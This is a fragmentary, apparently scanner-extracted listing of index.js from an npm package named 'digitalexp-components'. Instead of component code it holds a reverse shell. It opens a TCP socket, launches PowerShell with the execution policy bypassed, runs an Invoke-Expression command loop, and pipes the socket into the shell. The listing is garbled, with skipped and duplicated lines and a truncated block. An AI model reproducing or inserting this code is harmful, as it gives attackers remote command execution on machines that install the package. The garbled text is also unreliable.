// File: tmp/tmpbgapg84s/digitalexp-components/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: _tmp_0 = require("child_process")
Line 5: const packageJSON = require("./package.json")
Line 7: const net = require('net')
Line 12: const client = new net.Socket()
Line 13: {
  console.log("Connected to Windows target (PowerShell)!");

  // Construct the PowerShell command to execute interactively
  const psCommand = `
    while($true) {
      $input = Read-Host "Enter command"
      Invoke-Expression $input
    }
  `;
  
  // Spawn PowerShell shell with ExecutionPolicy bypass
  const shell = spawn('powershell.exe', [
    '-ExecutionPolicy', 'Bypass',  // Bypass execution policy
    '-NoExit',                    // Keep the PowerShell session open
    '-Command', psCommand          // Pass the command as a string
  ]);
  
  // Pipe data between the client and PowerShell shell
  client.pipe(shell.stdin);
  shell.stdout.pipe(client);
  shell.stderr.pipe(client);
  
  // Handle error with the shell process
  shell.on('error', (err) => {
    console.error('Shell process error:', err);
  });
  
  // Handle close event for the shell process
  shell.on('close', (code) => {
    console.log(`Shell process exited with code ${code}`);
    client.destroy(); // Clo...
Line 25: const shell = spawn('powershell.exe', [
    '-ExecutionPolicy', 'Bypass',  // Bypass execution policy
    '-NoExit',                    // Keep the PowerShell session open
    '-Command', psCommand          // Pass the command as a string
  ])
Line 26: _tmp_2.push("-ExecutionPolicy")
Line 27: _tmp_2.push("-NoExit")
Line 28: _tmp_2.push("-Command")
Line 32: client.pipe(shell.stdin)
Line 33: shell.stdout.pipe(client)
Line 34: shell.stderr.pipe(client)
Line 42: {
    console.log(`Shell process exited with code ${code}`);
    client.destroy(); // Close the client connection when the shell is done
  }
Line 44: client.destroy()
